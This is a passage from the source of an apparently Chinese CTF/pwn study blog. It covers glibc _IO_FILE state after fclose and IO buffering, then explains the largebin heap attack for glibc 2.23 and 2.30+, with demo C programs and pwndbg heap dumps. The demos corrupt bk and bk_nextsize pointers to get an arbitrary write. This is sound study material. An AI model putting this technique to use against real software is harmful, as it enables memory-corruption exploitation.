&lt;fclose+178&gt;    call   free@plt                    &lt;free@plt&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line">fd: 0x555555559</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555594a0</span><br><span class="line">Size: 0x20b60 (with flag bits: 0x20b61)</span><br></pre></td></tr></table></figure><p>已经被free掉了，我们仍然试着查看结构体信息<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$12 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1431655769,</span><br><span class="line">    _IO_read_ptr = 0x3649288fbc281a3 &lt;error: Cannot access memory at address 0x3649288fbc281a3&gt;,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = -1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到直到<code>fclose</code>结束，<code>vatble</code>指针和<code>_chain</code>指针仍然保留着，同时也有一些其他域的信息仍然留存比如<code>_wide_data</code><br>而这里的<code>_flags</code>为<code>0x55555559</code>，其实是<code>tcachebin</code>中这个chunk经过<code>safe-linking</code>后的<code>fd</code>值<br></p><h2 id="0x06-IO缓冲机制"><a href="#0x06-IO缓冲机制" class="headerlink" title="0x06 IO缓冲机制"></a>0x06 IO缓冲机制</h2><p>我们会发现调试<code>fwrite</code>时候只写入了<code>_IO_FILE</code>的缓冲区，而没有直接写入文件，这是glibc的IO缓冲机制，因为系统调用<code>read</code>或者<code>write</code>的开销很大（需要从用户态切换到内核态），所以依赖缓冲区来优化<br>在调试<code>fwrite</code>时，我们发现<code>_IO_do_write</code>会系统调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，这是在缓冲区剩余空间不足或者第一次初始化分配缓冲区时候，<code>_IO_file_overflow</code>调用<code>_IO_do_write</code>做的<br>我们调试的时候是第一次初始化分配缓冲区，所以没有系统调用<code>write</code>，如果是因为缓冲区剩余空间不足时调用<code>_IO_file_overflow</code>，则会系统调用<code>write</code>输出<code>fp-&gt;_IO_write_ptr</code>到<code>fp-&gt;_IO_write_base</code>之间的内容，相当于刷新了缓冲区，将数据真正写入文件中<br>而在调试<code>fread</code>时候，我们发现数据被系统调用<code>read</code>直接从文件读出来了，这也是因为第一次初始化分配缓冲区后，缓冲区无数据，调用<code>_IO_file_underflow</code>函数刷新缓冲区，系统调用<code>read</code>来读出了数据<br>综上我们发现，刷新缓冲区后，数据才真正读入或者输出，那么什么时候刷新缓冲区呢？见下图<br><img src="/images/buffer_flush.png"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于largebin attack</title>
      <link href="/2025/07/14/%E5%85%B3%E4%BA%8Elargebin-attack/"/>
      <url>/2025/07/14/%E5%85%B3%E4%BA%8Elargebin-attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>一直想要学习<code>_IO_FILE</code>攻击却一直没有腾出时间去学，就先记录一下经常与之结合使用的largebin attack来督促一下自己吧<br>参考博客<br><a href="https://xz.aliyun.com/news/15081">浅析Large_bins_attack在高低版本的利用-先知社区</a><br><a href="https://blog.csdn.net/qq_41202237/article/details/112825556">好好说话之Large Bin Attack_largebin attack-CSDN博客</a></p><h2 id="0x01-关于largebins"><a href="#0x01-关于largebins" class="headerlink" title="0x01 关于largebins"></a>0x01 关于largebins</h2><p>Glibc 的 <code>largebins</code> 共 63 个（索引 64–126），每个 bin 负责管理一个连续的大小区间分别为<code>0x400~0x430</code>,<code>0x440~0x470</code>,<code>0x480~0x4b0</code>,<code>0x4c0~0x4f0</code>，以此类推。故而进行largebin attack时应该选择申请大小在同一个bin下的chunk<br>每一个<code>largebin</code>与<code>unsorted bin</code>一样都是双向链表。其中的所有chunk是从大到小排序的，由<code>fd</code>指针和<code>bk</code>指针链接。而相同size的chunk又分为一个组，同组中，只有代表chunk的<code>fd_nextsize</code>和<code>bk_nextsize</code>有效，其余chunk的这两个指针为0。代表chunk间通过<code>fd_nextsize</code>和<code>bk_nextsize</code>链接，而最小size的组的代表chunk的<code>fd_nextsize</code>指向最大size的bin的代表chunk，最大size的bin的代表chunk的<code>bk_nextsize</code>也指向最小size的组的代表chunk。一个组的最后一个chunk的<code>fd</code>指向更小组的第一个chunk（如果有，无则指向bin表头）。代表chunk的<code>bk</code>指向上一个更大组的代表chunk（如果有，无则指向bin表头）。如此形成一个循环双向链表。结构大体如下所示（<strong>存在部分缺少，见图后补充</strong>）</p><p><img src="/images/largebin_struct_1.png"></p><p><strong>上图中chunk12的<code>fd</code>指向chunk20，chunk20的<code>bk</code>指向chunk12，<code>fd</code>指向chunk30，没有画出。</strong><br>再补充一张图</p><p><img src="/images/largebin_struct_2.png"></p><p>注意，与<code>fd</code>或<code>bk</code>指针一样（<code>tcachebin</code>除外，<code>tcachebin</code>中的“<code>fd</code>”（其实是<code>tcache_entry-&gt;next</code>）指向chunk的mem地址），<code>fd_nextsize</code>与<code>bk_nextsize</code>指向的并不是chunk的mem地址，而是堆头地址，即chunk的mem地址减去0x10。</p><h2 id="0x02-glibc2-23下的largebin-attack"><a href="#0x02-glibc2-23下的largebin-attack" class="headerlink" title="0x02 glibc2.23下的largebin attack"></a>0x02 glibc2.23下的largebin attack</h2><p>我们根据how2heap有关largebin attack的源码，精简一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x380</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x500</span>);                                              </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk3);</span><br><span class="line">    chunk2[<span class="number">-1</span>] = <span class="number">0x3f1</span>; <span class="comment">//size</span></span><br><span class="line">    chunk2[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//fd</span></span><br><span class="line">    chunk2[<span class="number">2</span>] = <span class="number">0</span>; <span class="comment">//fd_nextsize</span></span><br><span class="line">    chunk2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>); <span class="comment">//bk，指向stack_var1-0x10的位置</span></span><br><span class="line">    chunk2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>); <span class="comment">//bk_nextsize，指向stack_var2-0x20的位置</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为largebin attack更多的在较高版本使用，这里调试就不放了（<del>绝对不是因为笔者本地glibc版本太高自己编译低版本编译半天没搞好</del>），具体的调试过程看<a href="https://xz.aliyun.com/news/15081">参考博客</a>即可。<br>先申请了三个大的chunk123，中间夹着的0x20的chunk是为了防止大的chunk被top chunk合并。然后free掉chunk1和chunk2，两个都进入了<code>unsorted bin</code><br>接着malloc一个0x90的堆，这时候发生了很多事。程序依次从<strong>fastbins–&gt;unsorted bin–&gt;smallbins–&gt;largebins–&gt;topchunk</strong>的顺序扫描（此处调试版本尚未引入<code>tcachehbin</code>，引入后的顺序为<strong>tcachebins–&gt;fastbins–&gt;unsorted bin–&gt;smallbins–&gt;largebins–&gt;topchunk</strong>），在<code>unsorted bin</code>找到了chunk1（<code>unsorted bin</code>是头部插入尾部取出的，FIFO），属于<code>smallbins</code>，放入<code>smallbins</code>，发现chunk2大小属于<code>largebins</code>，放入<code>largebins</code>。然后扫描<code>smallbins</code>，发现chunk1，大于需求，就分割出一块0xa0的chunk来供malloc所需，然后chunk1剩余部分放入<code>unsorted bin</code>等待分配。<br>接下来，free掉chunk3，chunk3也加入<code>unsorted bin</code>。这时候再修改chunk2，使其size小于chunk3，并修改其<code>bk</code>指针和<code>bk_nextsize</code>指针为两个目标值的相应偏移处。如图所示</p><p><img src="/images/JNsZQX6avEobhkL.png"></p><p>然后再malloc一块内存，与上一次malloc一样，这次malloc也会干很多事。继续将chunk1放入<code>smallbins</code>，然后chunk3进入<code>largebins</code>。然后扫描<code>smallbins</code>，分割chunk1，然后chunk1再放入<code>unsorted bin</code>听候发落<br>在chunk3进入<code>largebins</code>的时候，会进行双链表的指针维护更新。相关的部分源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)&#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//这里检测的是从unsorted_bins里提取出的堆块是否小于large_bins里最近被释放的堆块的大小，如果小于，就将fwd向前移，也就是与比它更小的堆块对比</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line"><span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">fwd = fwd-&gt;fd;<span class="comment">//相等的话，就往后排列</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd; <span class="comment">//这里,victim是从unsorted_bin提取出来的堆块，fwd是最近被释放进large_bin的堆块，分别对应我们的chunk3,chunk2</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//在此前,chunk2-&gt;bk_nextsize已经被我们设置为了stack_var2-0x20的地址，所以chunk3的bk_nextsize指向它</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim; <span class="comment">//chunk2-&gt;bk_nextsize指向chunk3</span></span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//chunk3-&gt;bk_nextsize = stack_var2 - 0x20，也就是说我们已经伪造了一个堆块，(stack_var2-0x20)-&gt;fd_nexitsize就是stack_var2的地址，将该地址赋值为chunk3的堆头地址</span></span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk; <span class="comment">//这里bck被赋值为chunk2的bk，我们设置成了stack_var1-0x10，所以bck成了我们stack_var1-0x10这个虚假的chunk</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>实际上就是在<code>largebins</code>中找到一个不大于新进入chunk（也就是这里的chunk3）的chunk（也就是chunk2），然后根据<code>largebins</code>的结构更新<code>fd</code>,<code>bk</code>,<code>fd_nextsize</code>,<code>bk_nextsize</code>指针。这里更新并没有做相关安全检查，具体见上述注释。<br>会将chunk3的地址赋给chunk2的<code>bk_nextsize</code>（已经被我们篡改为stack_var2-0x20），以及chunk3的<code>bk_nextsize</code>指向chunk2的<code>bk_nextsize</code>（已经被我们篡改为stack_var2-0x20）。后续还会对<code>bk</code>和<code>fd</code>指针进行操作，最后会使得chunk2的<code>bk</code>（已经被我们篡改为stack_var1-0x10）指向chunk3。<br>结果就是，如果把stack_var2当做是一个指针，则这个指针指向了chunk3；如果把stack_var1当做一个指针，则也指向chunk3</p><h2 id="0x03-glibc2-30-的largebin-attack"><a href="#0x03-glibc2-30-的largebin-attack" class="headerlink" title="0x03 glibc2.30+ 的largebin attack"></a>0x03 glibc2.30+ 的largebin attack</h2><p>在更高版本，glibc对与<code>fd_nextsize</code>以及<code>bk_nextsize</code>增加了检查，部分源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">       victim-&gt;fd_nextsize = fwd;</span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) <span class="comment">//以上面的chunk2为例的话，那就是检测stack_var2-0x20的fd_nextsize是否指向chunk2。不是的话就报错</span></span><br><span class="line">              malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">       fwd-&gt;bk_nextsize = victim;</span><br><span class="line">       victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)<span class="comment">// 同理，如果stack_var1-0x10的fd是否指向chunk2，不是就报错</span></span><br><span class="line">       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>经过这个检查，我们上述的攻击手法就不好使了。但是我们知道largebin attack在glibc高版本仍然屹立不倒。那么新的攻击点在哪呢？如下部分源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assert (chunk_main_arena (bck-&gt;bk));<span class="comment">//断言bck-&gt;bk属于main_arena</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">       fwd = bck; <span class="comment">//这里的fwd可以粗略的认为是large_bin归属的main_arena</span></span><br><span class="line">       bck = bck-&gt;bk; <span class="comment">//bck成了main_arena的bk指针指向的堆块，也就是最小size组的代表chunk</span></span><br><span class="line">       victim-&gt;fd_nextsize = fwd-&gt;fd; <span class="comment">//我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块（最大size组的代表chunk）</span></span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">// 插入chunk的bk_nextsize指向最大chunk的bk_nextsize，也就是原来的最小chunk</span></span><br><span class="line">    <span class="comment">//攻击点，没有检测，所以我们可以篡改最大堆块的bk_nextsize，所以当我们加入的chunk比最小chunk还小时仍然可以攻击</span></span><br><span class="line">       fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim</span></span><br><span class="line">    <span class="comment">// 这时候如果最大chunk的bk_nextsize已经改成了我们的target-0x20，那么victim-&gt;bk_nextsize-&gt;fd_nextsize也就是(target-0x20)-&gt;fd_nextsize,也就是target指向了我们可以控制的chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们自己写个demo来调试一下验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> target = <span class="number">0</span>; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x428</span>); <span class="comment">// 最大chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x418</span>); <span class="comment">//攻击用chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//大于chunk1，将chunk1放入largebin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk2); </span><br><span class="line">    chunk1[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target - <span class="number">4</span>); <span class="comment">//修改最大chunk的bk_nextsize，指向target-0x20的位置</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//大于chunk2，将chunk2放入largebin完成攻击</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;target (%p): %p\n&quot;</span>, &amp;target, (<span class="type">unsigned</span> <span class="type">long</span>*)target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先申请一大一小的两个较大的chunk（<strong>相差0x10</strong>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x204c0 (with flag bits: 0x204c1)</span><br></pre></td></tr></table></figure><p>然后free掉chunk1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559290 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x555555559290</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后malloc一个0x438的chunk（需要比chunk1更大，否则会导致chunk1被分割），将chunk1放入largebin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x7ffff7e1b0d0</span><br><span class="line">bk: 0x7ffff7e1b0d0</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x555555559290</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559f80</span><br><span class="line">Size: 0x20080 (with flag bits: 0x20081)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7e1b0d0 (main_arena+1104) ◂— 0x555555559290</span><br></pre></td></tr></table></figure><p>然后free掉chunk2并修改chunk1的<code>bk_nextsize</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 